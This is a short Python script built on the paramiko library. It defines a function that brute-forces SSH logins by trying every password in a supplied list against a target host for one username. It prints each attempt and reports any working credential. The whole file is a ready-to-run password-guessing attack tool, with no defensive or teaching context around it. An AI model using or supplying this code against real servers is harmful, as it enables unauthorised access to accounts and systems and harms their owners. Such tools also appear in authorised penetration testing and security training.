import paramiko
import socket

def ssh_brute_force(target, username, password_list):
    print(f"[*] Starting SSH brute-force on {target} for user: {username}")
    
    for password in password_list:
        # Create an SSH client
        client = paramiko.SSHClient()
        # Automatically add the server's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            print(f"[*] Testing password: {password}", end="\r")
            client.connect(hostname=target, username=username, password=password, timeout=3)
            
            # If the code reaches here, the login was successful
            print(f"\n[+] SUCCESS! Username: {username} | Password: {password}")
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            # Wrong password, continue to the next one
            continue
        except socket.error as e:
            print(f"\n[!] Connection error: {e}")
            return False
        except Exception as e:
            print(f"\n[!] Error: {e}")
            continue
        finally:
            client.close()
            
    print("\n[-] Brute-force complete. No valid passwords found.")
    return False